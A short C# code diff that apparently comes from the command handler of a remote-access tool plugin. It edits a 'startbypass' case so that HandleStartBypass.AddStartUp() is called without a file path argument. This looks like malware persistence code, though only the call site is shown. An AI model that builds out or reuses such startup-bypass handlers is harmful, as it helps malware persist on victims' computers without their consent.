@@ -56,7 +56,7 @@ namespace Plugin
 
                     case "startbypass":
                         {
-                            HandleStartBypass.AddStartUp(unpack_msgpack.ForcePathObject("filepath").AsString);
+                            HandleStartBypass.AddStartUp();
                             //Connection.Disconnected();
                             break;
                         }
